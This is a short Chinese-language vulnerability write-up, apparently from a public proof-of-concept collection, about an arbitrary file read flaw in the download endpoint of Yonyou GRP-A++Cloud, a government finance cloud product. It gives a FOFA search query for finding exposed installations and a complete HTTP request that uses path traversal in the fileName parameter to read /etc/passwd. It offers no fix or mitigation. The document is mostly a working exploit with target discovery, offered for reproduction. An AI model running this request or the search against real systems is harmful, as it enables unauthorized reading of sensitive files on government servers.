# 用友GRP A++Cloud 政府财务云 任意文件读取漏洞

## 1.漏洞描述

用友 GRP-A++Cloud 政府财务云产品是以政府会计准则和预算管理一体化规范为基准，服务于政府行政事业单位，落实国家信创和行政事业单位内部控制规范要求，支持省级集中部署以及内部、外部业务协同，通过构建云原生服务，支撑业务的持续演化和变革，为政府业财一体化、财务规范化、自动化、智能化服务，打造安全、可靠、可控的信息化运行环境，提升各单位数字化治理能力。

在download页面参数为fileName处存在任意文件的读取漏洞

## 2.搜索语法

```markdown
fofa：body="/pf/portal/login/css/fonts/style.css"
```

## 3.漏洞复现

```markdown
GET /ma/emp/maEmp/download?fileName=../../../etc/passwd  HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
If-Modified-Since: Wed, 11 Oct 2023 05:16:05 GMT
Connection: close


```

![image](https://github.com/hardog123/poc-exp/assets/170905460/c568e13e-8a01-4c07-acd0-ad0e543136d5)
